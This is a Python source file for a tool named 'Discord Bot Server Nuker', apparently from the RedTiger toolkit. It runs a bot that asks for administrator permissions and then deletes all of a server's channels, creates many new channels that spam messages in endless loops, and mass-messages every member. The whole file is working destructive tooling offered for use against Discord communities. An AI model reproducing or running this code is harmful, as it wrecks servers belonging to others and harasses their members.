# Copyright (c) RedTiger 
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *
try:
    import discord
    from discord.ext import commands
except Exception as e:
   ErrorModule(e)
   
Title("Discord Bot Server Nuker")

try:
    def logs_command(cmd):
        print(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Command: {white}{PREFIX + cmd}")
    def logs_error(error):
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error: {white}{error}")

    Slow(discord_banner)
    token = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Bot Token -> {reset}")
    print()
    PREFIX = "!"

    intents = discord.Intents.default()
    intents.members = True
    intents.guilds = True
    intents.messages = True
    intents.message_content = True

    bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

    created_channel_ids = []

    try:
        @bot.event
        async def on_ready():
            await bot.change_presence(activity=discord.Game(name=f"Host By {github_tool}"))
            print(f"""
 {BEFORE + ">" + AFTER} Token  : {white}{token}
 {BEFORE + ">" + AFTER} Invite : {white}https://discord.com/oauth2/authorize?client_id={bot.user.id}&scope=bot&permissions=8
 {BEFORE + ">" + AFTER} Name   : {white}{bot.user.name}#{bot.user.id}
 {BEFORE + ">" + AFTER} Prefix : {white}{PREFIX}
 {BEFORE + ">" + AFTER} Status : {white}Online""")
            
            print(f"""
 {BEFORE + "!" + AFTER} Bot Commands:
 {red + PREFIX}nuke [Channels Number], [Channels Name], [Message Spam]
 {white}Delete all channels and create other channels and spam messages.
 {red + PREFIX}spam_channels [Channels Number], [Channels Name], [Message Spam]
 {white}Created channels that spam messages.
 {red + PREFIX}delete_channels
 {white}Delete all channels from the server.
 {red + PREFIX}stop_message_spam
 {white}Stop all messages that are being spammed.
 {red + PREFIX}send_pm [Message]
 {white}Send a pm message to all members of the server.
""")
    except:
        ErrorToken()

    @bot.command()
    async def nuke(ctx, *, args):
        global message_spam
        global spamming

        logs_command("nuke")
        arguments = [arg.strip() for arg in args.split(',')]

        if len(arguments) < 3:
            logs_error("Invalid Argument")
            return

        channels_number = arguments[0]
        channels_name = arguments[1]
        message_spam = arguments[2]

        try:
            int(channels_number)
        except:
            logs_error("Invalid Channels Number")
            return

        if len(arguments) > 3:
            message_spam = ", ".join(arguments[2:])

        guild = ctx.guild

        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Channel Delete: {white}{channel.name} ({channel.id})")
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Channel Not Delete: {white}{channel.name} ({channel.id}) {red}Error: {white}{e}")

        created_channel_ids.clear()

        spamming = True
        for i in range(int(channels_number)):
            new_channel = await guild.create_text_channel(channels_name)
            print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Channel Create: {white}{channels_name}")
            created_channel_ids.append(new_channel.id)
            bot.loop.create_task(spam_channel(new_channel))

    async def spam_channel(channel):
        global message_spam
        global spamming

        while spamming:
            try:
                await channel.send(message_spam)
                print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Message Send: {white}{message_spam}")
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Message Not Send: {white}{message_spam} {red}Error: {white}{e}")

    @bot.command()
    async def spam_channels(ctx, *, args):
        global message_spam
        global spamming

        logs_command("nuke")
        arguments = [arg.strip() for arg in args.split(',')]

        if len(arguments) < 3:
            logs_error("Invalid Argument")
            return

        channels_number = arguments[0]
        channels_name = arguments[1]
        message_spam = arguments[2]

        try:
            int(channels_number)
        except:
            logs_error("Invalid Channels Number")
            return

        if len(arguments) > 3:
            message_spam = ", ".join(arguments[2:])

        guild = ctx.guild

        spamming = True
        for i in range(int(channels_number)):
            new_channel = await guild.create_text_channel(channels_name)
            print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Channel Create: {white}{channels_name}")
            created_channel_ids.append(new_channel.id)
            bot.loop.create_task(spam_channel(new_channel))

    async def spam_channel(channel):
        global message_spam
        global spamming

        while spamming:
            try:
                await channel.send(message_spam)
                print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Message Send: {white}{message_spam}")
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Message Not Send: {white}{message_spam} {red}Error: {white}{e}")

    @bot.command()
    async def stop_message_spam(ctx):
        logs_command("stop_message_spam")
        global spamming
        spamming = False
        print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Spam Stopped.")

    @bot.command()
    async def delete_channels(ctx):
        global spamming

        spamming = False
        print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Spam Stopped.")
        logs_command("delete_channels")
        guild = ctx.guild
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Channel Delete: {white}{channel.name} ({channel.id})")   
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Channel Not Delete: {white}{channel.name} ({channel.id}) {red}Error: {white}{e}")

    @bot.command()
    async def send_pm(ctx, *, message: str):
        logs_command("send_pm")
        guild = ctx.guild

        async for member in guild.fetch_members(limit=None):
            if member != ctx.author:
                try:
                    await member.send(message)
                    print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} {green}Status: {white}Sent {green}User: {white}{member.name}#{member.discriminator} ({member.id}) {green}Message: {white}{message}")
                except discord.Forbidden:
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {red}Status: {white}Failed (Access denied) {red}User: {white}{member.name}#{member.discriminator} ({member.id}) {red}Message: {white}{message}")
                except Exception as e:
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {red}Status: {white + e} {red}User: {white}{member.name}#{member.discriminator} ({member.id}) {red}Message: {white}{message}")



    try:
        bot.run(token)
    except:
        ErrorToken()
except Exception as e:
    Error(e)